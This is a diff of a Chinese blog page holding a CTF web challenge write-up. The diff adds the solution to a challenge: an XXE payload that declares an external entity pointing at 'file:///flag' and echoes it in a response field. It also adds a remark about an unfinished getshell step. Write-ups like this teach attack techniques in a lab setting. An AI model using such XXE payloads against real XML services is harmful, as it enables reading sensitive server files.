@@ -227,7 +227,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">555字</span>
+        <span class="post-count">657字</span>
       </span>
     </span>
 
@@ -304,7 +304,16 @@ app<span class="token punctuation">.</span>config<span class="token punctuation"
 <p>然后去<code>/login</code>实现登录</p>
 <p>登录成功后页面回显 <code>登录成功~呜呜呜~请前往 /th1s_1s_The_L4st_one</code></p>
 <p>然后去<code>/th1s_1s_The_L4st_one</code> 路由</p>
-<p>这里是xml页面，要用到xxe，等学会了再补wp（</p>
+<p>这里是xml页面，要用到xxe，</p>
+<p>抓包测试发现在<code>&lt;web&gt;&lt;/web&gt;</code>处有回显位</p>
+<p>使用<code>file</code>协议xxe注入读取flag即可</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;
+&lt;result&gt;&lt;ctf&gt;杂鱼~&lt;&#x2F;ctf&gt;&lt;web&gt;&amp;xxe;&lt;&#x2F;web&gt;&lt;&#x2F;result&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <hr>
 <h2 id="Confronting-robot"><a href="#Confronting-robot" class="headerlink" title="Confronting robot"></a>Confronting robot</h2><blockquote>
 <p>报错注入+getshell</p>
@@ -329,6 +338,7 @@ app<span class="token punctuation">.</span>config<span class="token punctuation"
 
 <p>得到<code>/sEcR@t_n@Bodyknow.php</code></p>
 <p>然后来到这个页面，卡在执行命令上。。。</p>
+<p>看官方wp是要进行主从复制，但是我并没有vps（</p>
 
     </div>
     
